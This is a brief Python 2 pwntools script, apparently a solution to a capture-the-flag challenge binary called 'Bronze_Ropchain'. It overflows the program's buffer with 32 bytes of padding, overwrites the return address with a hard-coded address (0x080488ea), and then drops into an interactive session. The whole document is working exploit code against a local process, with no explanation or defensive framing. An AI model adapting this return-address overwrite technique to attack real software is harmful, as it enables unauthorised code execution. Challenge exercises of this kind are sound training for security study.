from pwn import*


p = process('./Bronze_Ropchain')


print p.recvline()
padding = "A"*28
padding += "b"*4
payload = p32(0x080488ea)
p.sendline(padding + payload)
print p.recvline()
print p.recvline()
p.send("A")


p.interactive()

